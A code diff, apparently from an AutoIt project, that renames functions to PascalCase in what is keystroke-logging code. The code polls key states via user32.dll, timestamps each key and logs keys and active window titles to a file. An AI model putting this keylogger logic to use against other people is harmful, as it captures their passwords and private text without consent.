@@ -1,12 +1,12 @@
-Func _isKeyPressed($sKeyHexCode)
+Func _IsKeyPressed($sKeyHexCode)
     Local $aReturn = DllCall('user32.dll', 'short', 'GetAsyncKeyState', 'int', '0x' & $sKeyHexCode)
 
     Return BitAND($aReturn[0], 0x8000) <> 0
 EndFunc
 
-Func _isKeyReleased($sKeyHexCode)
-    If _isKeyPressed($sKeyHexCode) Then
-        While _isKeyPressed($sKeyHexCode)
+Func _IsKeyReleased($sKeyHexCode)
+    If _IsKeyPressed($sKeyHexCode) Then
+        While _IsKeyPressed($sKeyHexCode)
             Sleep(10)
         WEnd
 
@@ -16,21 +16,21 @@ Func _isKeyReleased($sKeyHexCode)
     Return False
 EndFunc
 
-Func _hasWindowChanged($sWindow)
+Func _HasWindowChanged($sWindow)
     If $sWindow == $sCurrentWindow Then Return False
     $sCurrentWindow = $sWindow
 
     Return True
 EndFunc
 
-Func _wasKeyOfKeyTypePressed($aKeyType, $iMode = 0)
+Func _WasKeyOfKeyTypePressed($aKeyType, $iMode = 0)
     Local $iCountOfKeys = UBound($aKeyType) - 1
 
     For $i = 0 To $iCountOfKeys Step 1
         Local $sKeyHexCode = $aKeyType[$i][0]
         Local $sKey        = $aKeyType[$i][1]
 
-        If Not _isKeyReleased($sKeyHexCode) Then
+        If Not _IsKeyReleased($sKeyHexCode) Then
             ContinueLoop
         Else
             Local $sTimestamp   = @YEAR & '-' & @MON & '-' & @MDAY & ' ' & @HOUR & ':' & @MIN & ':' & @SEC & '.' & @MSEC
@@ -41,7 +41,7 @@ Func _wasKeyOfKeyTypePressed($aKeyType, $iMode = 0)
             Local $sEnterKey    = '0D'
 
             If $sKeyHexCode == $sEnterKey Then FileWrite($hLogFile, @CRLF)
-            If _hasWindowChanged($sActivWindow) Then FileWrite($hLogFile, $sTextBlock)
+            If _HasWindowChanged($sActivWindow) Then FileWrite($hLogFile, $sTextBlock)
 
             Switch $iMode
                 Case 1
